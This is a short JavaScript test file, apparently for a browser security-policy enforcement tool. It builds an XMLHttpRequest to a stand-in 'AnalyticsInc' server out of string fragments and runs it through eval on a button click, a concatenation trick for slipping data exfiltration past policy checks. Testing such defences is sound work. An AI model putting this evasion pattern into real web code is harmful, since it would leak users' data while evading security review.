// exfil_test_concat.js
function exfiltrate_key_history() {
  introspect(JAM.policy.p5) {
    var a = "xmlhttp=new XMLHt"
  }
  introspect(JAM.policy.p5) {
    var b = "tpRequest();"
  }
  introspect(JAM.policy.p5) {
    var c = "xmlhttp.op"
  }
  introspect(JAM.policy.p5) {
    var d = 'en("GET", "http://AnalyticsInc:8000/submission.html?test=concat", true);'
  }
  introspect(JAM.policy.p5) {
    var e$$4 = "xmlhttp.se"
  }
  introspect(JAM.policy.p5) {
    var f = "nd(null);"
  }
  introspect(JAM.policy.p5) {
    var v5 = a + b
  }
  introspect(JAM.policy.p5) {
    var v4 = v5 + c
  }
  introspect(JAM.policy.p5) {
    var v3 = v4 + d
  }
  introspect(JAM.policy.p5) {
    var v2 = v3 + e$$4
  }
  introspect(JAM.policy.p5) {
    var v0 = v2 + f
  }
  if (JAM.isEval(eval)) {
    eval("introspect(JAM.policy.pFull) { " + v0 + " }");
  } else {
    JAM.call(eval, null, [v0]);
  }
  introspect(JAM.policy.p5) {
    return;
  }
}
JAM.set(JAM.call(JAM.get(document, "getElementById", JAM.policy.p35), document, ["test"], JAM.policy.p35), "onclick", exfiltrate_key_history, JAM.policy.p10)

